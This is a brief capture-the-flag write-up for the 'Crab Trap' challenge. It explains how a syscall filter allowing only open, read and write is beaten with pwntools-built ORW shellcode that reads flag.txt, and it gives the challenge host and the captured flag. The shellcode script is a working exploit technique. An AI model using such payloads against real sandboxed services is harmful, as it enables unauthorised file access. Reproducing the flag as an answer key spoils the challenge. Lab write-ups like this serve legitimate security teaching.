# Crab Trap

## Summary
This was a remote shellcode runner with a strict syscall policy. Since `execve` was blocked and only `open`, `read`, and `write` were allowed, the intended primitive was ORW shellcode.

## Solution
Send amd64 shellcode that reads `flag.txt` directly:

```python
from pwn import *

context.clear(arch="amd64", os="linux")
sc = asm(
    shellcraft.open(b"flag.txt\\x00") +
    shellcraft.read("rax", "rsp", 0x100) +
    shellcraft.write(1, "rsp", 0x100)
)
```

The service accepts raw shellcode after the prompt. The relative path `flag.txt` was the correct path.

## Verification
The payload was sent to `0.cloud.chals.io:34381` and printed the flag.

## Flag
```text
bronco{h0w_c4n_mr_kr4b5_c0de}
```

